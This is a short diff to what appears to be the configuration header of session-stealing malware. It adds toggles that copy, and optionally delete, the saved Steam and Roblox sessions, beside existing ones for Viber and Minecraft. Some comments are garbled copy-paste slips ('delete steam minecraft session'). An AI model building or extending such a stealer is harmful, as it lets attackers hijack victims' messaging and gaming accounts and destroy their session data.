@@ -19,3 +19,7 @@
 #define DELORIGVIBER     false  // Enable delete original viber session. For disable replace true to false
 #define COPYMINECRAFT    true  // Enable copy minecraft session. For disable replace true to false
 #define DELORIGMINECRAFT false  // Enable delete original minecraft session. For disable replace true to false
+#define COPYSTEAM        true  // Enable copy steam session. For disable replace true to false
+#define DELORIGSTEAM     false  // Enable delete steam minecraft session. For disable replace true to false
+#define COPYROBLOX       true  // Enable copy roblox session. For disable replace true to false
+#define DELORIGROBLOX    false  // Enable delete roblox minecraft session. For disable replace true to false
